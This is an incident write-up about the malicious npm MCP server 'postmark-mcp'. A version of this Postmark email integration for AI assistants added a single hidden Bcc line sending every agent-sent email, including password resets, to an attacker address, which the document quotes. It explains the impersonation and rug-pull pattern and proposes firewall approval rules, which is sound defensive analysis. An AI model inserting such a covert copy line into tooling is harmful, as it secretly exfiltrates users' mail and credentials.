# Malicious postmark-mcp MCP server blind-copied user emails to the attacker

- Date: 2025-09 | Agent/tool: `postmark-mcp` npm MCP server (email integration for AI assistants) | Axis: mcp

## What happened

On 2025-09-25 Koi Security published what it called the world's first documented malicious MCP server found in the wild. The npm package `postmark-mcp`, downloaded about 1,500 times a week, let developers wire Postmark transactional email into AI assistants: the agent could send password resets, invoices and notifications on the user's behalf. The author posed as a real Paris-based software engineer with a legitimate GitHub profile. Versions 1.0.0 through 1.0.15 were clean and worked flawlessly, which made the package trusted infrastructure in hundreds of developer workflows. Version 1.0.16 changed exactly one thing: a single line at line 231 added `Bcc: 'phan@giftshop.club'`, so every email the assistant sent was silently blind-copied to the attacker. Koi estimated roughly 300 organizations were affected, funneling on the order of 3,000 to 15,000 emails per day — including password resets and credentials — to `giftshop.club`. After Koi reached out, the developer deleted the package from npm, but copies already installed on machines kept BCCing. Postmark (ActiveCampaign) confirmed it had never published an official MCP server to npm and told users to remove the package and rotate credentials.

## How it went wrong

This is impersonation plus a rug pull, and almost nothing happens at the OS level. The attacker copied the code of Postmark's official-looking MCP repository, added the one-line BCC, and published it to npm under the name Postmark itself had never claimed. A developer adds the server to their MCP configuration; the coding tool spawns it as an ordinary child process, typically `node index.js` under npx or a direct node call, with the Postmark API token in the environment. Every email flows as a normal HTTPS API request from that node process to the legitimate `api.postmarkapp.com`. The BCC field rides inside that encrypted request body, added by the server code after the agent's tool call. There is no shell, no unexpected child process, no second network destination, no credential file read — the exfiltration channel is the vendor API the tool was installed to use, carrying data the tool was installed to carry.

## What the firewall should learn

The stolen payload itself is invisible to the OS monitor: it is TLS traffic to the correct vendor host, and even a stdio capture of the MCP JSON-RPC shows only legitimate `send_email` tool calls, because the BCC is injected in the server code. What the firewall can see and gate is the trust lifecycle of the MCP server: exec of a node/npx process whose path is an MCP server package, holding a mail API token in its environment (`POSTMARK_TOKEN`-shaped env at exec is fully visible), and connecting to the vendor API. Rule ideas: approval_required for the first exec of any MCP server command that the session's configuration did not declare at monitor start; re-approval when an MCP server's package files were written (npm update visible as file_open write under the package directory) shortly before the server is exec'd — the rug-pull moment; and host pinning, where a mail MCP server exec'd with a Postmark token that later connects to any host other than the vendor API it was configured for is approval_required. None of these would have read the BCC, but each would have forced a human look at exactly the artifact that hid it.

## Sources

- [Koi Security: First Malicious MCP in the Wild — The Postmark Backdoor That's Stealing Your Emails](https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft)
- [Postmark: Information Regarding Malicious "postmark-mcp" Package](https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package)
- [Snyk: Malicious MCP Server on npm postmark-mcp Harvests Emails](https://snyk.io/blog/malicious-mcp-server-on-npm-postmark-mcp-harvests-emails/)
- [Dark Reading: Sneaky, Malicious MCP Server Exfiltrates Secrets via BCC](https://www.darkreading.com/application-security/malicious-mcp-server-exfiltrates-secrets-bcc)
